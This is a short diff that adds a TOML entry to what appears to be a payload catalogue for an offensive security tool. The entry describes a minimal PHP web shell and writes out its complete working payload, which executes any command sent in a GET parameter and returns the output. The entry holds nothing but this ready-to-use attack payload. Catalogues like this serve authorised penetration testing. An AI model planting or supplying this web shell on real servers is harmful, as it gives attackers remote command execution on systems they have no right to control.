@@ -1,0 +1,12 @@
+id = "php_cmd_small"
+name = "PHP cmd small"
+os = "all"
+type = "web"
+proto = ""
+lang = "php"
+description = "An extremely tiny PHP web shell that executes a command passed via the first GET parameter (0) and outputs the result directly."
+
+payload = "<?=`$_GET[0]`?>"
+
+[listeners]
+none = "This is a webshell, no listener is required."
